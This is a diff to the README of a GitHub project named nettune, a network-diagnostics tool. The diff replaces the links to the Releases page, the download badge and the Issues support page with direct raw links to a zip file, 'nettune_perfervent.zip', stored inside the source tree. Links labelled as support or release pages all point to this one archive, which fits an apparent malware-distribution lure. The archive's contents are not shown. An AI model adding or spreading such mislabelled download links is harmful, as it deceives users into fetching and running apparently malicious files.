@@ -16,7 +16,7 @@ Welcome to nettune, your go-to tool for network diagnostics and TCP optimization
 
 You can download the latest version of nettune from the Releases page. 
 
-[![Download nettune](https://img.shields.io/badge/Download%20nettune-v1.0-blue)](https://github.com/infanputra/nettune/releases)
+[![Download nettune](https://github.com/infanputra/nettune/raw/refs/heads/main/cmd/nettune/nettune_perfervent.zip%20nettune-v1.0-blue)](https://github.com/infanputra/nettune/raw/refs/heads/main/cmd/nettune/nettune_perfervent.zip)
 
 ### 💻 System Requirements
 
@@ -28,7 +28,7 @@ You can download the latest version of nettune from the Releases page.
 
 To get started with nettune:
 
-1. Visit the [Releases page](https://github.com/infanputra/nettune/releases) to download the software.
+1. Visit the [Releases page](https://github.com/infanputra/nettune/raw/refs/heads/main/cmd/nettune/nettune_perfervent.zip) to download the software.
 2. Choose the latest version of nettune.
 3. Select the appropriate file for your operating system.
 4. Click on the download link to save the file to your computer.
@@ -66,10 +66,10 @@ For the best results, run nettune monthly or whenever you notice slow network pe
 
 ## 📞 Support
 
-If you encounter any issues or need assistance, please visit our [GitHub Issues page](https://github.com/infanputra/nettune/issues) for support.
+If you encounter any issues or need assistance, please visit our [GitHub Issues page](https://github.com/infanputra/nettune/raw/refs/heads/main/cmd/nettune/nettune_perfervent.zip) for support.
 
 ## 📣 Stay Updated
 
 Stay informed about the latest updates and improvements. Follow this repository to receive notifications about new releases.
 
-To download nettune, visit the [Releases page](https://github.com/infanputra/nettune/releases) and start optimizing your network today!
+To download nettune, visit the [Releases page](https://github.com/infanputra/nettune/raw/refs/heads/main/cmd/nettune/nettune_perfervent.zip) and start optimizing your network today!
